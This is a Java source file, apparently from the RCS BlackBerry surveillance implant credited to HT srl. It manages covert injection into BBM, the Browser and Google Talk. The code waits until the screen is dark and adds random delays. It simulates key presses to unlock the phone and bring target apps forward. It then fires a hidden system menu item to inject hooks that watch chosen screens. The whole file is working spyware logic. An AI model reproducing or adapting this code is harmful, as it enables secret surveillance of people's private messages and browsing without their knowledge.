//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection;

import java.util.Timer;
import java.util.TimerTask;

import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.AppListener;
import blackberry.Device;
import blackberry.Singleton;
import blackberry.Status;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.AInjector;
import blackberry.injection.injectors.BBMInjector;
import blackberry.injection.injectors.BrowserInjector;
import blackberry.injection.injectors.GoogleTalkInjector;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.interfaces.iSingleton;
import blackberry.utils.Utils;

/**
 * Singleton class used to manage injections of Injector-s. Once initialized, it
 * reacts on backlight and on applicationChange.
 * 
 * @author Zeno
 * 
 */
public class InjectorManager implements ApplicationObserver, iSingleton,
        BacklightObserver {
    private static final long APP_TIMER_PERIOD = 5000;
    private static final long GUID = 0x58b6431f259bac8dL;
    private static final int RUNON_APP = 1;
    private static final int RUNON_BACKLIGHT = 2;
    private static final int KEY_LOCK = 4099;

    private static final int MAX_TRIES = 3;
    //#ifdef DEBUG
    private static Debug debug = new Debug("InjectorManager",
            DebugLevel.VERBOSE);
    //#endif

    private static InjectorManager instance;

    AInjector[] injectors;
    //Hashtable injectorMap = new Hashtable();

    ApplicationManager manager = ApplicationManager.getApplicationManager();

    private InjectorSystemMenu menu;

    private String actualMod;
    private String actualName;
    private AInjector injector;
    private boolean injecting;
    private int started = 0;
    private Status status = Status.self();

    public synchronized static InjectorManager getInstance() {

        if (instance == null) {
            instance = (InjectorManager) Singleton.self().get(GUID);
            if (instance == null) {
                final InjectorManager singleton = new InjectorManager();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }

        }
        return instance;
    }
    
    private InjectorManager() {
        // TODO: aggiungere new LiveInjector(), new YahooInjector()
        injectors = new AInjector[] { new BrowserInjector(), new BBMInjector(),
                new GoogleTalkInjector() };

        for (int i = 0; i < injectors.length; i++) {
            injector = injectors[i];
            if (!exists(injector.getCodName())) {
                //#ifdef DEBUG
                debug.trace("InjectorManager, not existent application, disabling: "
                        + injector.getCodName());
                //#endif
                injector.disable();
            }
        }
    }

    public void start() {
        //#ifdef DEBUG
        debug.trace("start");
        //#endif

        //#ifdef DBC
        Check.requires(started >= 0, "start, started: " + started);
        //#endif
        synchronized (this) {
            started += 1;

            if (started > 1) {
                //#ifdef DEBUG
                debug.trace("start, already started");
                //#endif
                return;
            }
        }

        AppListener appListener = AppListener.getInstance();
        appListener.addApplicationObserver(this);
        appListener.addBacklightObserver(this);

        //appListener.suspendable(true);

        if (!Backlight.isEnabled()) {
            injectAll();
        }

    }

    public void stop() {
        synchronized (this) {
            started -= 1;
            if (started > 0) {
                //#ifdef DEBUG
                debug.trace("stop, not started");
                //#endif
                return;
            }
        }

        //#ifdef DEBUG
        debug.trace("stop");
        //#endif

        AppListener appListener = AppListener.getInstance();
        appListener.removeApplicationObserver(this);
        appListener.removeBacklightObserver(this);
        if (menu != null) {
            menu.removeMenu();
        }
        //if (injectorMap != null) {
        //    injectorMap.clear();
        //}

    }

    /**
     * Tries to inject all the applications.
     * 
     * @return true if all injected
     */
    private void injectAll() {
        synchronized (this) {
            if (injecting) {
                return;
            }
            injecting = true;
        }

        try {

            boolean allInjected = true;
            for (int i = 0; i < injectors.length; i++) {
                injector = injectors[i];

                allInjected &= inject(injector);
            }

        } finally {
            synchronized (this) {
                injecting = false;
            }
        }

    }

    /**
     * 
     * @param injector
     * @return true if it's not needed to inject anymore, because injected or
     *         disabled
     */
    private boolean inject(AInjector injector) {
        //#ifdef DEBUG
        debug.trace("injectAll " + injector);
        //#endif

        boolean wantLight = Status.self().wantLight();
        //#ifdef BBM_DEBUG
        wantLight = true;
        //#endif

        if (!injector.enabled()) {
            //#ifdef DEBUG
            debug.trace("inject, disabled: " + injector);
            //#endif
            return true;
        }

        if (injector.isInjected()) {
            //#ifdef DEBUG
            debug.trace("inject, already infected: " + injector);
            //#endif
            return true;
        }

        if (injector.getTries() > MAX_TRIES) {
            //#ifdef DEBUG
            debug.trace("inject, too many tries");
            //#endif
            return true;
        }

        if (status.backlightEnabled()) {
            //#ifdef DEBUG
            debug.trace("inject, backlight, bailing out");
            //#endif
            return false;
        }

        String name = injector.getCodName();
        //injectorMap.put(name, injector);

        status.setBacklight(false);
        manager.requestForegroundForConsole();

        if (wantLight) {
            Debug.ledFlash(Debug.COLOR_RED);
        }

        unLock();

        if (wantLight) {
            Debug.ledStart(Debug.COLOR_ORANGE);
        }

        if (Status.self().isDemo()) {
            Utils.sleep(1000);
        } else {
            Utils.sleep(Utils.randomInt(5, 10) * 1000);
        }

        if (wantLight) {
            Debug.ledStop();
        }

        if (status.backlightEnabled()) {
            //#ifdef DEBUG
            debug.trace("inject, backlight, bailing out");
            //#endif
            if (wantLight) {
                Debug.playSoundError(1);
            }
            return false;
        }

        if (wantLight) {
            Debug.ledFlash(Debug.COLOR_YELLOW);
        }
        if (requestForeground(name)) {
            if (wantLight) {
                Debug.ledFlash(Debug.COLOR_GREEN);
            }

            //#ifdef DEBUG
            debug.trace("inject, executed: " + name);
            //#endif

            if (status.backlightEnabled()) {
                //#ifdef DEBUG
                debug.trace("inject, backlight, bailing out");
                //#endif
                if (wantLight) {
                    Debug.playSoundError(2);
                }
                return false;
            }
            injector.incrTries();

            Utils.sleep(1000);
            if (checkForeground(name)) {

                if (status.backlightEnabled()) {
                    //#ifdef DEBUG
                    debug.trace("inject, backlight, bailing out");
                    //#endif
                    if (wantLight) {
                        Debug.playSoundError(3);
                    }
                    return false;
                }

                if (wantLight) {
                    Debug.ledFlash(Debug.COLOR_BLUE_LIGHT);
                }

                addSystemMenu(injector);

                Utils.sleep(300);
                callSystemMenu();
                Utils.sleep(600);
                //if (checkForeground(name)) {
                //    callSystemMenuRecover();
                //}

                removeSystemMenu();

                manager.requestForegroundForConsole();
                if (wantLight) {
                    Debug.ledFlash(Debug.COLOR_WHITE);
                }
            }
        }
        return false;
    }

    private boolean checkForeground(String codname) {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            //#ifdef DEBUG
            debug.trace("checkForeground: " + apps[i].getName());
            //#endif
            if (apps[i].getModuleName().indexOf(codname) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    //#ifdef DEBUG
                    debug.trace("checkForeground, found");
                    //#endif
                    return true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("checkForeground, found but not foreground");
                    //#endif
                    return false;
                }
            }
        }
        return false;
    }

    private void addSystemMenu(AInjector injector) {
        //#ifdef DEBUG
        debug.trace("addSystemMenu");
        //#endif
        menu = new InjectorSystemMenu(this, injector);
        menu.addMenu();

    }

    private void callSystemMenu() {
        //#ifdef DEBUG
        debug.trace("callSystemMenu");
        //#endif

        int waitTime = 500;

        //#ifdef BBM_DEBUG
        Status.self().setBacklight(true);
        Utils.sleep(waitTime);
        //#endif

        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);

        /*
         * if(injector.isLastTry()){
         * KeyInjector.pressRawKeyCode(Keypad.KEY_MENU); }
         */

        Utils.sleep(waitTime);

        KeyInjector.trackBallRaw(20, true);
        if (Device.getInstance().atLeast(7, 0)) {
            //#ifdef DEBUG
            debug.trace("callMenuByKey, version 7, track ball up");
            //#endif

        } else {
            //#ifdef DEBUG
            debug.trace("callMenuByKey, version <7, pressing menu: " + menu);
            //#endif
            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
        }

        Utils.sleep(waitTime);
        KeyInjector.trackBallRawClick();
        //KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        //Utils.sleep(waitTime);
        //KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);

    }

    private void callSystemMenuRecover() {
        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        Utils.sleep(500);
        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
    }

    /**
     * verifica se occorre procedere con l'unlock.
     */
    public static boolean unLock() {
        //#ifdef DEBUG
        debug.trace("unLock: "
                + ApplicationManager.getApplicationManager().isSystemLocked());
        //#endif

        Status status = Status.self();

        if (status.backlightEnabled()) {
            return false;
        }

        try {

            KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
            Utils.sleep(300);

            if (status.backlightEnabled()) {
                //#ifdef DEBUG
                debug.trace("Backlight still enabled, getHardwareLayout: "
                        + Keypad.getHardwareLayout());
                //#endif

                KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
                KeyInjector.pressRawKeyCode(InjectorManager.KEY_LOCK);
                status.setBacklight(false);
                Utils.sleep(100);
                status.setBacklight(false);
                for (int i = 0; i < 10; i++) {
                    if (status.backlightEnabled()) {
                        //Backlight.enable(false);
                        Utils.sleep(500);
                        //#ifdef DEBUG
                        debug.trace("unLock: backlight still enabled");
                        //#endif
                    } else {
                        return true;

                    }
                }
            }
        } finally {
            //Main.getInstance().popBlack();
        }
        return false;
    }

    private void removeSystemMenu() {
        //#ifdef DEBUG
        debug.trace("removeSystemMenu");
        //#endif

        ApplicationMenuItemRepository.getInstance().removeMenuItem(
                ApplicationMenuItemRepository.MENUITEM_SYSTEM, menu);

    }

    private boolean requestForeground(String codName) {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            if (apps[i].getModuleName().indexOf(codName) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: already foreground");
                    //#endif
                    return true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: bringing foreground");
                    //#endif
                    manager.requestForeground(processId);
                    return true;
                }
            }
        }

        return false;
    }

    private ApplicationDescriptor getApplicationDescriptor(String executeName) {
        //#ifdef DBC
        Check.requires(executeName != null,
                "getApplicationDescriptor null command"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("getApplicationDescriptor executeName= " + executeName); //$NON-NLS-1$
        //#endif

        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.

            final String name = CodeModuleManager.getModuleName(handle);
            if (name.equals(executeName)) {
                //#ifdef DEBUG
                debug.trace("checkCommand, command found: " + executeName); //$NON-NLS-1$
                //#endif
                ApplicationDescriptor[] apps = CodeModuleManager
                        .getApplicationDescriptors(handle);
                if (apps != null && apps.length > 0) {
                    //#ifdef DEBUG
                    debug.trace("checkCommand: got applicationDescription"); //$NON-NLS-1$
                    //#endif
                    return apps[0];

                }
            }
        }

        //#ifdef DEBUG
        debug.warn("getApplicationDescriptor: not found"); //$NON-NLS-1$
        //#endif
        return null;

    }

    /**
     * check if a codname is installed in the system
     * 
     * @param name
     * @return
     */
    private boolean exists(String name) {
        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.
            final String modname = CodeModuleManager.getModuleName(handle);
            if (modname.equals(name)) {
                //#ifdef DEBUG
                debug.trace("exists, found: " + name);
                //#endif
                return true;
            }
        }
        return false;
    }

    public void runOnBacklight() {
        //#ifdef DEBUG
        debug.trace("runOnBacklight");
        //#endif

        UiApplication.getUiApplication().invokeLater(new Runnable() {
            public void run() {
                injectAll();
            }
        });
    }

    /**
     * questa funzione viene chiamata ogni n secondi, se l'applicazione e' di
     * interesse
     */
    public void runOnApp() {
        //#ifdef DEBUG
        debug.trace("runOnApp");
        //#endif

        //final AInjector injector = (AInjector) injectorMap.get(actualMod);

        final AInjector injector = (AInjector) findValidInjector(actualMod);

        if (injector != null && injector.enabled() && injector.isInjected()) {
            final Screen screen = injector.getInjectedApp().getActiveScreen();
            String screenName = screen.getClass().getName();
            //#ifdef DEBUG
            debug.trace("onApplicationChange: " + screenName);
            //#endif

            //#ifdef DBC
            Check.requires(injector.enabled(), "run, injector disabled");
            //#endif

            for (int i = 0; i < injector.getWantedScreen().length; i++) {
                String s = injector.getWantedScreen()[i];
                if (screenName.endsWith(s)) {
                    //#ifdef DEBUG
                    debug.trace("onApplicationChange: screen found");
                    //#endif

                    UiApplication.getUiApplication().invokeLater(
                            new Runnable() {

                                public void run() {
                                    injector.init();
                                    injector.playOnScreen(screen);
                                }
                            });

                    break;
                }
            }
        }
    }

    private AInjector findValidInjector(String codName) {
        try {
            //#ifdef DBC
            Check.requires(codName != null, "findInjector, null codName");
            //#endif
            for (int i = 0; i < injectors.length; i++) {
                AInjector injector = injectors[i];
                if (injector == null) {
                    //#ifdef DEBUG
                    debug.error("findInjector, null injector");
                    //#endif
                    continue;
                }

                if (codName.equals(injector.getCodName()) && injector.enabled()
                        && injector.isInjected()) {
                    return injector;
                }
            }
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            debug.error("findInjector");
            //#endif
        }

        return null;
    }

    class RunInjectorTask extends TimerTask {

        private int runOn;

        RunInjectorTask(int runOn) {
            this.runOn = runOn;

        }

        public void run() {
            if (runOn == RUNON_APP) {
                runOnApp();
            } else if (runOn == RUNON_BACKLIGHT) {
                runOnBacklight();
            }
        }

    }

    boolean foreInterestApp = false;
    private Object applicationTimerLock = new Object();

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {

        //#ifdef DEBUG
        debug.trace("onApplicationChange name: " + startedName + " cod: "
                + startedMod);
        //#endif

        try {
            synchronized (applicationTimerLock) {
                if (status.applicationTimer != null) {
                    status.applicationTimer.cancel();
                    status.applicationTimer = null;
                }
            }

            if (findValidInjector(startedMod) != null) {
                foreInterestApp = true;
                //#ifdef DEBUG
                debug.trace("onApplicationChange, starting");
                //#endif
                this.actualMod = startedMod;
                this.actualName = startedName;
                startApplicationTimer();
            } else {
                //#ifdef DEBUG
                debug.trace("onApplicationChange, not interesting");
                //#endif
                foreInterestApp = false;
            }
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            debug.error("onApplicationChange");
            //#endif
        }
    }

    private void startApplicationTimer() {
        synchronized (applicationTimerLock) {
            status.applicationTimer = new Timer();

            RunInjectorTask task = new RunInjectorTask(RUNON_APP);
            status.applicationTimer.schedule(task, APP_TIMER_PERIOD,
                    APP_TIMER_PERIOD);
        }
    }

    public synchronized void onBacklightChange(boolean value) {
        //#ifdef DEBUG
        debug.trace("onBacklightChange: " + value);
        //#endif
        if (!value) {
            RunInjectorTask task = new RunInjectorTask(RUNON_BACKLIGHT);

            int waitSeconds = Utils.randomInt(11, 30);
            //#ifdef DEBUG
            debug.trace("onBacklightChange, waiting: " + waitSeconds);
            //#endif
            
            synchronized(applicationTimerLock ){
                if (status.applicationTimer != null) {
                    status.applicationTimer.cancel();
                    status.applicationTimer = null;
                }

                status.applicationTimer = new Timer();
                status.applicationTimer.schedule(task, waitSeconds * 1000,
                    Integer.MAX_VALUE);
            }
        } else {
            if (foreInterestApp) {
                startApplicationTimer();
            }
        }
    }

}
